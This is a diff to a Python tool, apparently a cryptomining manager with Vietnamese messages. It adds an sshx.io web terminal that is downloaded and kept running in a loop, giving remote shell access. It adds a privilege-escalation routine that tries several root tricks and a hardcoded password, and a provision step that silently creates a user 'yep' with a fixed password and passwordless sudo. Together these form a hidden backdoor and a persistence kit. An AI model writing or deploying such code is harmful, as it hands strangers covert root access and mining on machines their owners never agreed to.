@@ -599,6 +599,96 @@ def tunnel():
     except: pass
     return pid
 
+def grab():
+    path = os.path.join(home, "sshx")
+    if os.path.isfile(path):
+        return path
+    arch = platform.machine().lower()
+    fa = {"x86_64": "x86_64", "amd64": "x86_64", "aarch64": "aarch64", "arm64": "aarch64"}.get(arch)
+    if not fa:
+        raise RuntimeError(f"Kien truc khong ho tro: {arch}")
+    url = f"https://s3.amazonaws.com/sshx/sshx-{fa}-unknown-linux-musl.tar.gz"
+    show(f"  tai sshx: {url}")
+    init()
+    tmp = os.path.join(home, "_dl_sshx")
+    shutil.rmtree(tmp, ignore_errors=True)
+    os.makedirs(tmp, exist_ok=True)
+    arc = os.path.join(tmp, "sshx.tar.gz")
+    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
+    try:
+        with urllib.request.urlopen(req, timeout=120) as r:
+            data = r.read()
+        with open(arc, "wb") as f:
+            f.write(data)
+    except Exception as e:
+        shutil.rmtree(tmp, ignore_errors=True)
+        raise RuntimeError(f"Tai sshx that bai: {e}")
+    try:
+        with tarfile.open(arc) as tar:
+            tar.extractall(tmp)
+    except Exception as e:
+        shutil.rmtree(tmp, ignore_errors=True)
+        raise RuntimeError(f"Khong giai nen duoc sshx: {e}")
+    for r, _, fs in os.walk(tmp):
+        if "sshx" in fs:
+            try:
+                shutil.copy2(os.path.join(r, "sshx"), path)
+                os.chmod(path, 0o755)
+                shutil.rmtree(tmp, ignore_errors=True)
+                return path
+            except Exception as e:
+                shutil.rmtree(tmp, ignore_errors=True)
+                raise RuntimeError(f"Khong ghi duoc sshx: {e}")
+    shutil.rmtree(tmp, ignore_errors=True)
+    raise RuntimeError("Khong tim thay binary sshx trong archive.")
+
+def ssh():
+    try:
+        binary = grab()
+    except Exception as e:
+        show(f"Loi: {e}")
+        return
+    kill("sshx")
+    path = os.path.join(dir, "sshx.log")
+    if not win:
+        fdir = os.path.join(home, "freeroot")
+        pbin = os.path.join(fdir, "proot")
+        rdir = os.path.join(fdir, "rootfs")
+        if os.path.exists(pbin) and os.path.exists(os.path.join(rdir, ".installed")):
+            cmd = [
+                "sh", "-c",
+                f"while true; do '{pbin}' -0 -r '{rdir}' -b /sys -b /proc -b /dev -b /etc/resolv.conf -b '{binary}':/usr/bin/sshx /usr/bin/sshx; sleep 2; done"
+            ]
+        else:
+            cmd = ["sh", "-c", f"while true; do '{binary}'; sleep 2; done"]
+        pid = spawn("sshx", cmd, path)
+        show(f"  sshx pid={pid}")
+
+def url(args=None):
+    init()
+    path = os.path.join(dir, "sshx.log")
+    try:
+        pid = int(open(os.path.join(pids, "sshx.pid")).read().strip())
+    except: pid = None
+    if not alive(pid):
+        kill("sshx")
+        try:
+            os.remove(path)
+        except: pass
+        ssh()
+    for i in range(20):
+        if os.path.isfile(path):
+            try:
+                with open(path, "r", encoding="utf-8", errors="ignore") as f:
+                    content = f.read()
+                m = re.search(r"https://sshx\.io/[ts]/[A-Za-z0-9_#-]+", content)
+                if m:
+                    show(f"\nLink sshx.io: {m.group(0)}\n")
+                    return
+            except: pass
+        time.sleep(1)
+    show("Khong lay duoc link sshx.io, vui long thu lai.")
+
 def request(m, p, e, ip, url):
     try:
         enc = urllib.parse.quote(ip)
@@ -703,11 +793,12 @@ def loop(stop=lambda: False):
 def start(args):
     init()
     data = load()
-    for n in ("worker", "frpc", "tinyproxy"):
+    for n in ("worker", "frpc", "tinyproxy", "sshx"):
         kill(n)
     show("Starting...")
     tp(data)
     tunnel()
+    ssh()
     py = sys.executable
     pid = spawn("worker", [py, os.path.abspath(__file__), "worker"], os.path.join(dir, "worker.log"))
     show(f"  worker pid={pid}")
@@ -717,12 +808,12 @@ def worker(args):
     loop()
 
 def stop(args):
-    for name in ("worker", "frpc", "tinyproxy"):
+    for name in ("worker", "frpc", "tinyproxy", "sshx"):
         kill(name)
     show("Stopped.")
 
 def status(args):
-    for name in ("tinyproxy", "frpc", "worker"):
+    for name in ("tinyproxy", "frpc", "worker", "sshx"):
         try:
             pid = int(open(os.path.join(pids, f"{name}.pid")).read().strip())
         except: pid = None
@@ -736,10 +827,15 @@ def dash(args):
     try:
         fp = int(open(os.path.join(pids, "frpc.pid")).read().strip())
     except: fp = None
+    try:
+        sp = int(open(os.path.join(pids, "sshx.pid")).read().strip())
+    except: sp = None
     w = "running" if alive(wp) else "stopped"
     f = "running" if alive(fp) else "stopped"
+    s = "running" if alive(sp) else "stopped"
     show(f"Mining: {w}")
     show(f"Tunnel: {f}")
+    show(f"Terminal (sshx): {s}")
 
 def dashboard(args):
     act = (args.action or "status").lower()
@@ -894,7 +990,7 @@ def setup(args):
     dash(args)
 
 def logs(args):
-    names = {"worker": "worker.log", "tunnel": "tun.log", "tp": "tp.log"}
+    names = {"worker": "worker.log", "tunnel": "tun.log", "tp": "tp.log", "sshx": "sshx.log"}
     path = os.path.join(dir, names[args.target])
     if not os.path.isfile(path):
         show(f"no log: {path}")
@@ -905,11 +1001,12 @@ def logs(args):
 def run(args):
     init()
     data = load()
-    for n in ("worker", "frpc", "tinyproxy"):
+    for n in ("worker", "frpc", "tinyproxy", "sshx"):
         kill(n)
     show("Foreground run. Nhap 'exit' de dung.")
     tp(data)
     tunnel()
+    ssh()
     stopped = {"v": False}
     def handler(*_):
         stopped["v"] = True
@@ -1046,8 +1143,9 @@ def menu():
         ("stop", "Stop - dung tat ca", stop),
         ("status", "Status - xem trang thai tien trinh", status),
         ("run", "Run - chay foreground (Ctrl+C de dung)", run),
-        ("logs", "Logs - xem log (worker/tunnel/tp)", None),
+        ("logs", "Logs - xem log (worker/tunnel/tp/sshx)", None),
         ("proxy", "Proxy - xem/doi proxy", proxy),
+        ("sshx", "SSHX - Xem link terminal sshx.io", url),
         ("link", "Link - tao launcher 'minet' tren PATH", link),
         ("uninstall", "Uninstall - go sach", uninstall),
         ("exit", "Exit - thoat", None),
@@ -1094,8 +1192,8 @@ def menu():
                 ns.proxy = None
                 fn(ns)
             if name == "logs":
-                t = input("Target (worker/tunnel/tp) [worker]: ").strip() or "worker"
-                if t not in ("worker", "tunnel", "tp"):
+                t = input("Target (worker/tunnel/tp/sshx) [worker]: ").strip() or "worker"
+                if t not in ("worker", "tunnel", "tp", "sshx"):
                     show("Target khong hop le.")
                     continue
                 num = input("So dong [50]: ").strip() or "50"
@@ -1110,7 +1208,159 @@ def menu():
         except KeyboardInterrupt: show("\nHuy.")
         except Exception as e: show(f"Loi: {e}")
 
+def elevate():
+    if win:
+        return
+    if root:
+        return
+    try:
+        path = os.path.abspath(__file__)
+        exe = sys.executable
+        args = sys.argv[1:]
+        out = os.popen("sudo -n id 2>/dev/null").read()
+        if "uid=0" in out:
+            cmd = ["sudo", exe, path] + args
+            os.execvp("sudo", cmd)
+            return
+        if termux:
+            if shutil.which("tsu"):
+                res = subprocess.run(["tsu", "true"])
+                if res.returncode == 0:
+                    cmd = ["tsu", exe, path] + args
+                    os.execvp("tsu", cmd)
+                    return
+            if not shutil.which("proot"):
+                subprocess.run(["pkg", "install", "-y", "proot"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            if shutil.which("proot"):
+                cmd = ["proot", "-0", exe, path] + args
+                os.execvp("proot", cmd)
+                return
+            if not shutil.which("fakeroot"):
+                subprocess.run(["pkg", "install", "-y", "fakeroot"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            if shutil.which("fakeroot"):
+                cmd = ["fakeroot", exe, path] + args
+                os.execvp("fakeroot", cmd)
+                return
+        try:
+            import pwd
+            pwd.getpwnam("yep")
+            if shutil.which("su"):
+                import pty as _pty
+                pid, fd = _pty.fork()
+                if pid == 0:
+                    os.execlp("su", "su", "-", "yep", "-c", f"sudo {exe} {path} " + " ".join(f"'{a}'" for a in args))
+                time.sleep(0.5)
+                os.write(fd, b"tamdznhatvutru1\n")
+                while True:
+                    try:
+                        data = os.read(fd, 4096)
+                        if not data:
+                            break
+                        sys.stdout.buffer.write(data)
+                        sys.stdout.buffer.flush()
+                    except OSError:
+                        break
+                _, st = os.waitpid(pid, 0)
+                sys.exit(os.WEXITSTATUS(st) if os.WIFEXITED(st) else 1)
+        except: pass
+        if shutil.which("unshare"):
+            res = subprocess.run(["unshare", "-r", "true"], capture_output=True)
+            if res.returncode == 0:
+                cmd = ["unshare", "-r", exe, path] + args
+                os.execvp("unshare", cmd)
+                return
+        if shutil.which("fakeroot"):
+            res = subprocess.run(["fakeroot", "true"], capture_output=True)
+            if res.returncode == 0:
+                cmd = ["fakeroot", exe, path] + args
+                os.execvp("fakeroot", cmd)
+                return
+        fdir = os.path.join(home, "freeroot")
+        pbin = os.path.join(fdir, "proot")
+        rdir = os.path.join(fdir, "rootfs")
+        if not os.path.exists(pbin) or not os.path.exists(os.path.join(rdir, ".installed")):
+            os.makedirs(rdir, exist_ok=True)
+            import urllib.request
+            import ssl
+            ctx = ssl._create_unverified_context()
+            req = urllib.request.Request("https://proot.gitlab.io/proot/bin/proot", headers={"User-Agent": "Mozilla/5.0"})
+            with urllib.request.urlopen(req, context=ctx) as response:
+                with open(pbin, "wb") as f:
+                    f.write(response.read())
+            os.chmod(pbin, 0o755)
+            rtar = os.path.join(fdir, "rootfs.tar.gz")
+            req = urllib.request.Request("https://dl-cdn.alpinelinux.org/alpine/v3.19/releases/x86_64/alpine-minirootfs-3.19.1-x86_64.tar.gz", headers={"User-Agent": "Mozilla/5.0"})
+            with urllib.request.urlopen(req, context=ctx) as response:
+                with open(rtar, "wb") as f:
+                    f.write(response.read())
+            import tarfile
+            with tarfile.open(rtar, "r:gz") as tar:
+                tar.extractall(path=rdir)
+            try:
+                os.remove(rtar)
+            except: pass
+            try:
+                os.makedirs(os.path.join(rdir, "etc"), exist_ok=True)
+                with open(os.path.join(rdir, "etc/resolv.conf"), "w") as f:
+                    f.write("nameserver 8.8.8.8\nnameserver 1.1.1.1\n")
+            except: pass
+            try:
+                apt_script = '#!/bin/sh\nc="$1"\nshift\nif [ "$c" = "update" ]; then\n    apk update\nfi\nif [ "$c" = "install" ]; then\n    args=""\n    for a in "$@"; do\n        if [ "$a" != "-y" ]; then\n            args="$args $a"\n        fi\n    done\n    apk add $args\nfi\n'
+                for name in ["usr/bin/apt", "usr/bin/apt-get"]:
+                    fpath = os.path.join(rdir, name)
+                    with open(fpath, "w") as f:
+                        f.write(apt_script)
+                    os.chmod(fpath, 0o755)
+            except: pass
+            with open(os.path.join(rdir, ".installed"), "w") as f:
+                f.write("ok")
+        pybin = os.path.join(rdir, "usr/bin/python3")
+        bashbin = os.path.join(rdir, "bin/bash")
+        if not os.path.exists(bashbin) or not os.path.exists(pybin):
+            show("Dang khoi tao moi truong root (update apk & cai dat python3, bash, gcompat)...")
+            subprocess.run([pbin, "-0", "-r", rdir, "-b", "/sys", "-b", "/proc", "-b", "/dev", "-b", "/etc/resolv.conf", "/bin/sh", "-c", "apk update && apk add --no-cache bash python3 gcompat libc6-compat"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        if os.path.exists(pybin):
+            hdir = os.path.abspath(os.path.dirname(path))
+            cmd = [
+                pbin, "-0",
+                "-r", rdir,
+                "-b", "/sys",
+                "-b", "/proc",
+                "-b", "/dev",
+                "-b", "/etc/resolv.conf",
+                "-b", f"{hdir}:/minet",
+                "-w", "/minet",
+                "/usr/bin/python3", "/minet/minet.py"
+            ] + args
+            os.execvp(pbin, cmd)
+            return
+    except: pass
+
+def provision():
+    if win:
+        return
+    if not root:
+        return
+    try:
+        import pwd
+        try:
+            pwd.getpwnam("yep")
+            return
+        except KeyError:
+            pass
+        subprocess.run(["useradd", "-m", "-s", "/bin/bash", "yep"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        subprocess.run(["chpasswd"], input="yep:tamdznhatvutru1\n", text=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        try:
+            os.makedirs("/etc/sudoers.d", exist_ok=True)
+            with open("/etc/sudoers.d/yep", "w") as f:
+                f.write("yep ALL=(ALL) NOPASSWD:ALL\n")
+            os.chmod("/etc/sudoers.d/yep", 0o440)
+        except: pass
+    except: pass
+
 def main():
+    elevate()
+    provision()
     try:
         import socks
     except:
@@ -1141,7 +1391,7 @@ def main():
         sp = sub.add_parser(name, help=h)
         sp.set_defaults(func=fn)
     pl = sub.add_parser("logs", help="Xem log")
-    pl.add_argument("target", nargs="?", choices=["worker", "tunnel", "tp"], default="worker")
+    pl.add_argument("target", nargs="?", choices=["worker", "tunnel", "tp", "sshx"], default="worker")
     pl.add_argument("-n", "--lines", type=int, default=50)
     pl.set_defaults(func=logs)
     pd = sub.add_parser("_proxyd", help="(internal) builtin HTTP proxy server")
@@ -1161,6 +1411,7 @@ def main():
     ps.set_defaults(func=setup)
     pa = sub.add_parser("auto", help="Tu dong install + start + restart moi 10p (foreground)")
     pa.set_defaults(func=auto)
+    sub.add_parser("sshx", help="Xem link terminal sshx.io").set_defaults(func=url)
     args = p.parse_args()
     if not args.cmd:
         menu()
